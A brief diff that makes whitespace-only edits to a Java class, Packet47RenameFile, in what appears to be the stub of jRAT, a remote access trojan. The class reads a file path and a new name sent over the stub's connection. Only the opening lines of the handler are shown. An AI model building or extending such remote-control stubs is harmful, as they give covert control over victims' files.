@@ -5,10 +5,8 @@ import java.io.File;
 import pro.jrat.common.codec.Hex;
 import pro.jrat.stub.Connection;
 
-
-
 public class Packet47RenameFile extends AbstractIncomingPacket {
-	
+
 	public void read() throws Exception {
 		String file = Connection.readLine();
 		String newname = Connection.readLine();
